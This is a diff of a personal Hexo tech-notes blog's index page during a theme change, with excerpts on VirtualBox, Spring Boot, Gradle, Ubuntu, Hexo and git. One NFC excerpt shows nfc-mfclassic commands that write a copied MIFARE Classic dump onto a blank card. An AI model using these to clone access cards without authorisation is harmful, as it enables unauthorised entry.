 <figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> vboxmanage --version</span></span><br><span class="line">6.0.4r128413</span><br></pre></td></tr></table></figure>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://aaray6.github.io/2019/02/11/nfc/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Ray Qu">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="My Notes">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/02/11/nfc/" itemprop="url">NFC Notes</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-02-11T10:16:17+08:00">
-                2019-02-11
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
         </div>
-      </header>
     
 
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
+</div>
+            
+                
+<div class="post">
 
-      
-      
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2019/02/11/nfc/">
+                NFC Notes
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2019-02-11</span>
+            
+            
+            
+        </div>
+    </div>
 
-      
-        
-          
+    
+        <div class="content">
             <h1 id="NFC笔记"><a href="#NFC笔记" class="headerlink" title="NFC笔记"></a>NFC笔记</h1><p>在淘宝上买了一个IC卡复制工具</p>
 <p><img src="/myimages/nfc_01_reader.png" alt="小黑NFC读卡器"></p>
 <p><img src="/myimages/nfc_01_reader2.png" alt="小黑NFC读卡器"></p>
@@ -959,923 +491,251 @@
 <figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> nfc-mfclassic w b blank-chinese.dmp cardtocopy.dmp</span></span><br><span class="line">or</span><br><span class="line"><span class="meta">#</span><span class="bash"> nfc-mfclassic w a blank-chinese.dmp cardtocopy.dmp</span></span><br></pre></td></tr></table></figure>
 <p>经比较，这个Linux下的命令与Windows下提供的软件做出来的卡内容相同。</p>
 
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://aaray6.github.io/2018/03/22/springboot/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Ray Qu">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="My Notes">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/03/22/springboot/" itemprop="url">Spring boot notes</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-03-22T16:10:50+08:00">
-                2018-03-22
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
         </div>
-      </header>
     
 
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
+</div>
+            
+                
+<div class="post">
 
-      
-      
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2018/03/22/springboot/">
+                Spring boot notes
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2018-03-22</span>
+            
+            
+            
+        </div>
+    </div>
 
-      
-        
-          
+    
+        <div class="content">
             <h1 id="Springboot"><a href="#Springboot" class="headerlink" title="Springboot"></a>Springboot</h1><p><a href="https://projects.spring.io/spring-boot/" target="_blank" rel="noopener">Official site</a></p>
 <h2 id="Start-a-new-Spring-boot-project"><a href="#Start-a-new-Spring-boot-project" class="headerlink" title="Start a new Spring boot project"></a>Start a new Spring boot project</h2><p><a href="https://start.spring.io/" target="_blank" rel="noopener">Tool to generate base framework</a></p>
 <p><img src="/myimages/springboot_start.png" alt="Spring Boot Start"></p>
 
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://aaray6.github.io/2018/03/22/gradle/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Ray Qu">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="My Notes">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/03/22/gradle/" itemprop="url">Gradle Notes</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-03-22T16:10:42+08:00">
-                2018-03-22
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
         </div>
-      </header>
     
 
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
+</div>
+            
+                
+<div class="post">
 
-      
-      
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2018/03/22/gradle/">
+                Gradle Notes
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2018-03-22</span>
+            
+            
+            
+        </div>
+    </div>
 
-      
-        
-          
+    
+        <div class="content">
             <h1 id="Gradle"><a href="#Gradle" class="headerlink" title="Gradle"></a>Gradle</h1><p>Gradle是一个基于Apache Ant和Apache Maven概念的项目自动化建构工具。它使用一种基于Groovy的特定领域语言来声明项目设置，而不是传统的XML。 当前其支持的语言限于Java、Groovy和Scala，计划未来将支持更多的语言</p>
 <h2 id="install"><a href="#install" class="headerlink" title="install"></a>install</h2><p><a href="https://gradle.org/install/" target="_blank" rel="noopener">Install</a><br>Gradle Wrapper is recommended. It doesn’t need to install Gradle.</p>
 <h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><blockquote>
 <p><a href="https://gradle.org/" target="_blank" rel="noopener">https://gradle.org/</a><br><a href="http://blog.jobbole.com/99638/" target="_blank" rel="noopener">http://blog.jobbole.com/99638/</a></p>
 </blockquote>
 
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://aaray6.github.io/2018/03/01/ubuntu1604/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Ray Qu">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="My Notes">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/03/01/ubuntu1604/" itemprop="url">ubuntu 16.04 notes</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-03-01T09:15:57+08:00">
-                2018-03-01
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
         </div>
-      </header>
     
 
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
+</div>
+            
+                
+<div class="post">
 
-      
-      
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2018/03/01/ubuntu1604/">
+                ubuntu 16.04 notes
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2018-03-01</span>
+            
+            
+            
+        </div>
+    </div>
 
-      
-        
-          
+    
+        <div class="content">
             <h1 id="Tips-for-Ubuntu-16-04"><a href="#Tips-for-Ubuntu-16-04" class="headerlink" title="Tips for Ubuntu 16.04"></a>Tips for Ubuntu 16.04</h1><h2 id="Browser-to-support-Java"><a href="#Browser-to-support-Java" class="headerlink" title="Browser to support Java"></a>Browser to support Java</h2><p>Install Firefox 51. The new Firefox and Chrome don’t support Java anymore.<br>Install IcedTea Java Web Start to support Java plugin.</p>
 <h2 id="Full-screen-a-window"><a href="#Full-screen-a-window" class="headerlink" title="Full screen a window"></a>Full screen a window</h2><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmctrl -r "Cloud Desktop GCG - Citrix Receiver for Java" -b toggle,fullscreen</span><br></pre></td></tr></table></figure>
 <h2 id="Switch-between-multi-desktop"><a href="#Switch-between-multi-desktop" class="headerlink" title="Switch between multi-desktop"></a>Switch between multi-desktop</h2><p>CTRL+ALT+ UP/DOWN/LEFT/RIGHT<br>SUPER + S</p>
 <h2 id="check-CPU-Temp"><a href="#check-CPU-Temp" class="headerlink" title="check CPU Temp"></a>check CPU Temp</h2><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install lm-sensors</span><br><span class="line">...</span><br><span class="line">quxr@quxr-ThinkPad-X201:~$ sensors</span><br><span class="line">coretemp-isa-0000</span><br><span class="line">Adapter: ISA adapter</span><br><span class="line">Core 0:       +60.0°C  (high = +95.0°C, crit = +105.0°C)</span><br><span class="line">Core 2:       +58.0°C  (high = +95.0°C, crit = +105.0°C)</span><br><span class="line"></span><br><span class="line">acpitz-virtual-0</span><br><span class="line">Adapter: Virtual device</span><br><span class="line">temp1:        +65.0°C  (crit = +100.0°C)</span><br><span class="line"></span><br><span class="line">thinkpad-isa-0000</span><br><span class="line">Adapter: ISA adapter</span><br><span class="line">fan1:        3464 RPM</span><br><span class="line">temp1:        +65.0°C  </span><br><span class="line">temp2:         +0.0°C  </span><br><span class="line">temp3:         +0.0°C  </span><br><span class="line">temp4:         +0.0°C  </span><br><span class="line">temp5:         +0.0°C  </span><br><span class="line">temp6:         +0.0°C  </span><br><span class="line">temp7:         +0.0°C  </span><br><span class="line">temp8:         +0.0°C</span><br></pre></td></tr></table></figure>
 
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://aaray6.github.io/2018/02/27/hexo/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Ray Qu">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="My Notes">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/02/27/hexo/" itemprop="url">Hexo notes</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-02-27T23:22:57+08:00">
-                2018-02-27
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
         </div>
-      </header>
     
 
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
+</div>
+            
+                
+<div class="post">
 
-      
-      
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2018/02/27/hexo/">
+                Hexo notes
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2018-02-27</span>
+            
+            
+            
+        </div>
+    </div>
 
-      
-        
-          
+    
+        <div class="content">
             <h1 id="Hexo-notes"><a href="#Hexo-notes" class="headerlink" title="Hexo notes"></a>Hexo notes</h1><h2 id="some-commands"><a href="#some-commands" class="headerlink" title="some commands"></a>some commands</h2><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo new "pagename"</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://aaray6.github.io/2018/02/27/git/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Ray Qu">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="My Notes">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/02/27/git/" itemprop="url">git notes</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-02-27T23:04:10+08:00">
-                2018-02-27
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
         </div>
-      </header>
     
 
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="git-notes"><a href="#git-notes" class="headerlink" title="git notes"></a>git notes</h1><h2 id="to-put-existing-content-into-repository"><a href="#to-put-existing-content-into-repository" class="headerlink" title="to put existing content into repository"></a>to put existing content into repository</h2><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone &lt;URL&gt; &lt;somefolder&gt;</span><br><span class="line">cp -R &lt;somefolder&gt;/.git &lt;existing folder&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="check-remote-URL"><a href="#check-remote-URL" class="headerlink" title="check remote URL"></a>check remote URL</h2><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote -v</span><br></pre></td></tr></table></figure>
-<h2 id="change-remote-URL-from-https-to-ssh-or-from-ssh-to-https"><a href="#change-remote-URL-from-https-to-ssh-or-from-ssh-to-https" class="headerlink" title="change remote URL (from https to ssh or from ssh to https)"></a>change remote URL (from https to ssh or from ssh to https)</h2><p>get the URL<br><img src="/myimages/git_repository_url.png" alt="img"></p>
-<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote set-url origin &lt;remote-URL&gt;</span><br></pre></td></tr></table></figure>
-<h2 id="some-commands"><a href="#some-commands" class="headerlink" title="some commands"></a>some commands</h2><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push *</span><br></pre></td></tr></table></figure>
-<h2 id="GIT-CRLF"><a href="#GIT-CRLF" class="headerlink" title="GIT CRLF"></a>GIT CRLF</h2><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config core.autocrlf</span><br><span class="line">git config --global core.autocrlf false</span><br></pre></td></tr></table></figure>
-          
-        
-      
+</div>
+            
+        </section>
     </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-  </section>
-
-  
-  <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
-  </nav>
-
-
-
-          </div>
-          
-
-
-          
-
-        </div>
-        
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
-
-  <aside id="sidebar" class="sidebar">
-    
-    <div class="sidebar-inner">
-
-      
-
-      
-
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-            
-              <p class="site-author-name" itemprop="name">Ray Qu</p>
-              <p class="site-description motion-element" itemprop="description">My Tech Notes and Other stuff</p>
-          </div>
-
-          <nav class="site-state motion-element">
-
-            
-              <div class="site-state-item site-state-posts">
-              
-                <a href="/archives/">
-              
-                  <span class="site-state-item-count">16</span>
-                  <span class="site-state-item-name">posts</span>
-                </a>
-              </div>
-            
-
-            
-
-            
-
-          </nav>
-
-          
-
-          
-
-          
-          
-
-          
-          
-
-          
-
-        </div>
-      </section>
-
-      
-
-      
-
-    </div>
-  </aside>
-
-
-        
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
-  <span class="with-love">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">Ray Qu</span>
-
-  
 </div>
 
 
-  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
 
+    <div class="row">
+        <div class="col-sm-12">
+            <div class="wrap-pagination">
+                <a class="disabled" href="/">
+                    <i class="fa fa-chevron-left" aria-hidden="true"></i>
+                </a>
+                <a class="" href="/page/2/">
+                    <i class="fa fa-chevron-right" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+
+
+
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
+                <h2>About</h2>
+                <p>
+                    <a href="about.html">I love games</a>
+                </p>
+            </div>
+            
+    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
+        <h2>Recent Posts</h2>
+        <ul>
+            
+            <li>
+                <a class="footer-post" href="/2019/03/04/hexo-theme-AlphaDust/">hexo_theme_AlphaDust</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2019/02/27/metasploit/">metasploit</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2019/02/27/ubuntu-ext-display/">ubuntu18.04双显示器</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2019/02/22/kali-usage/">Kali Linux应用</a>
+            </li>
+            
+        </ul>
+    </div>
+
+
+
+            
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/aaray6">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:aaray@21cn.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    Copyleft
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- After footer scripts -->
 
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
 
-  <span class="post-meta-divider">|</span>
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
 
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
 
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
 
-  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+<!-- Disqus Comments -->
 
 
-
-
-        
-
-
-
-
-
-
-
-        
-      </div>
-    </footer>
-
-    
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
-      </div>
-    
-
-    
-
-  </div>
-
-  
-
-<script type="text/javascript">
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
-  }
-</script>
-
-
-
-
-
-
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
-  
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
-
-  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
-
-
-
-  
-  
-
-  
-
-  
-
-
-  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
-
-
-
-  
-
-
-  
-
-
-
-
-	
-
-
-
-
-
-  
-
-
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-
-
-
-
-  
-
-  
-
-  
-
-  
-  
-
-  
-
-  
-
-  
 
 </body>
+
 </html>
